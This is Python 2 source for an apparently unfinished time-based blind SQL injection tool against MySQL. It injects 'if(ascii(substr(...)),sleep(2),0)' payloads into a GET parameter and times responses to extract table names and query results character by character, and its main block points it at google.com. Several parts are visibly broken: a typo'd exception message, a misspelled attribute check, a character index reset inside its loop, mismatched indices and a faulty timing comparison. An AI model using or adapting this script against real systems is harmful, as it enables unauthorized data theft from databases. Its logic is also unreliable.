import urllib2
import urllib
import time
import math

CHARSET = [chr(x) for x in xrange(32,39)] + [chr(x) for x in xrange(40,127)] #everything bug '
CHARSET_LEN = len(CHARSET)

#TODO:
#	implement a diff function with some sort of regex. for non-time based blind that might have variations between identical requests. probably part of response

class NotImplemented(Exception):
	def __init__(self, value):
		self.value = value
	def __repr__(self):
		return "This isn't implemented yet: " + serlf.value


class requester(object):
	'''This is responsible for parsing input to determine what a base request will look like. It also handles making requests from parm values from a technique'''
	def __init__(self,config):
		self.config = config

	def make_request(self):
		raise NotImplemented("requester.make_request")

class get_http_requester(requester):
	def make_request(self,param=None,value=None):
		params = dict(self.config.params)
		if param and value:
			params[param] += value
		url_param = urllib.urlencode(params)
		url = "http://" + self.config.host + ":" + self.config.port + self.config.uri + url_param
		print url
		req = urllib2.Request(url,headers=self.config.headers)
		time_start = time.time()
		raw_res = urllib2.urlopen(req)
		time_stop  = time.time()
		time_delta = time_stop - time_start
		data = raw_res.read()
		res = response(data,time_delta)
		return res

class config(object):
	def __init__(self):
		pass

class get_http_config(config):
	def __init__(self,host,uri,params,port=80,headers={}):
		self.host = host
		self.port = port
		self.uri = uri
		self.params = params
		self.headers = headers

class query(object):
	'''query syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". Anything inside ${} will be settable and will be rendered based on value set'''
	def __init__(self,q_string,options=None):
		self.q_string = q_string
		if options:
			self.options = options
		else:
			self.options = self.parse_query(q_string)
	
	def get_option(self,ident):
		return self.options[ident]
	
	def set_option(self,ident,val):
		self.options[ident] = val

	def get_options(self):
		return self.options
	
	def set_options(self,options):
		self.options = options
	
	def parse_query(self,q):
		options = {}
		section = q.split("${")
		if len(section) > 1:
			for section in section[1:]:
				inside = section.split("}")[0].split(":")
				ident = inside[0]
				if len(inside) > 1:
					default = inside[1]
				else:
					default = ""
				options[ident] = default
		return options
	
	def render(self):
		section = self.q_string.split("${")
		output = section[0]
		if len(section) > 1:
			for section in section[1:]:
				split = section.split('}')
				left = split[0]
				#in case there happens to be a rogue } in our query
				right = '}'.join(split[1:])
				ident = left.split(':')[0]
				val = self.options[ident]
				output += val
				output += right
		return output

	def copy(self):
		return query(self.q_string,self.options)


class response(object):
	def __init__(self,data,time_delta):
		self.data = data
		self.time_delta = time_delta
	
	def get_time(self):
		return self.time_delta

	def get_data(self):
		return self.data

	def data_eq(self,response):
		return self.data == response.get_data()

	def time_eq(self,response,error_percent=75):
		#we call them equal if their times differ by less than 75 percent from the base. this should be adjusted in the future for performace optimization TODO
		return error_percent > (math.fabs(self.time_delta - response.get_time())/((self.time_delta - response.get_time())/2))*100
	

class technique(object):
	'''This is a sql injection teqnique. Eg. Union based or Time based'''
	def __init__(self,make_request_func,test_param,dbms):
		if dbms not in self.dbmss:
			raise NotImplemented("this technique isn't implemented for this dbms")	
		self.make_request_func = make_request_func
		self.test_param = test_param

	def test(self):
		return False

	def run(self):
		raise NotImplemented("technique.run")


class blind_technique(technique):
	'''This implements a blind sql injection attack. NOTE: this isn't fully implemented and is only intended to be used as a parent class for sub-types of blind sql injection'''
	def run(self,user_query):
		self.user_query = user_query
		try:
			self.base_respon
		except:
			self._make_base_request()
		results = []
		row_index = 0
		while 1:
			#TODO: clean this up a bit
			#finding a row
			row = ""
			while 1:
				#finding a character
				char_index = 1
				low = 0
				high = CHARSET_LEN
				while low < high:
					#testing a character
					mid = int((low+high)/2)
					if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
						low = mid + 1   
					else:
					    high = mid
				if low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
					row += CHARSET[low]
					char_index += 1
				
				else:
				    break
			if row != "":
				results += [row]
				row_index += 1
			else:
				#we will only run until we find an empty row. This obviously isn't a good idea #TODO change this
				break
		return results

	def _is_greater(self,row_index,char_index,char_val):
		raise NotImplemented("blind_technique._is_greater")

	def _is_equal(self,row_index,char_index,char_val):
		raise NotImplemented("blind_technique._is_equal")
	
	def _make_base_request(self):
		raise NotImplemented("blind_technique.make_base_request")


class time_blind_technique(blind_technique):
	'''This implements a time base blind sql injection'''
	def __init__(self,make_request_func,test_param,dbms,sleep=2):
		self.dbms = dbms
		self.sleep = sleep
		#list of currently implemeted dbmss
		self.dbmss = ['mysql']
		mysql_query_greater = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))>${char_val:123},sleep(${sleep:2}),0)=0")
		mysql_query_equal = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))=${char_val:123},sleep(${sleep:2}),0)=0")
		self.queries_greater = {'mysql':mysql_query_greater}
		self.queries_equal = {'mysql':mysql_query_equal}
		super(time_blind_technique,self).__init__(make_request_func,test_param,dbms)
	
	def _is_greater(self,row_index,char_index,char_val,user_query):
		query = self.queries_greater[self.dbms].copy()
		query.set_option('user_query',user_query)
		query.set_option('row_index',str(row_index))
		query.set_option('char_index',str(char_index))
		query.set_option('char_val',str(ord(char_val)))
		query.set_option('sleep',str(self.sleep))
		query_string = query.render()
		res = self.make_request_func(self.test_param,query_string)
		return not res.time_eq(self.base_response)

	def _is_equal(self,row_index,char_index,char_val,user_query):
		query = self.queries_equal[self.dbms].copy()
		query.set_option('user_query',user_query)
		query.set_option('row_index',str(row_index))
		query.set_option('char_index',str(char_index))
		query.set_option('char_val',str(ord(char_val)))
		query.set_option('sleep',str(self.sleep))
		query_string = query.render()
		res = self.make_request_func(self.test_param,query_string)
		return not res.time_eq(self.base_response)
	
	def _make_base_request(self):
		self.base_response = self.make_request_func()


def dict_to_tuples(dict):
	output = []
	for i in dict:
		output = (i,dict[i])
	return output

if __name__ == "__main__":
	host = "google.com"
	port = "80"
	uri = "/?"
	params = {"test":"haha"}
	headers = {}
	config = get_http_config(host=host,port=port,uri=uri,params=params,headers=headers)
	requester = get_http_requester(config)
	tech = time_blind_technique(make_request_func=requester.make_request,test_param='test',dbms='mysql',sleep=2)
	results = tech.run('SELECT user()')
	print results
	